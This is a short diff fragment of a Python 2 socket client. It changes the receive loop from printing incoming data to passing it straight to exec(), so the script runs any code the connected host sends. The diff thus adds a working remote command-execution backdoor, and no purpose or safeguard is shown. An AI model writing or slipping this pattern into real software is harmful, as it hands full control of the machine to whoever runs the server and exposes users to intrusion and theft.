@@ -8,8 +8,9 @@ s.connect((HOST, PORT))
 
 try:
     while 1:
-        data = s.recv(1024)
-        print 'Received' , repr(data)
+        data = s.recv(1024).strip()
+        #print 'Received' , repr(data)
+        exec(data)
 except:
     s.send("stop")
 
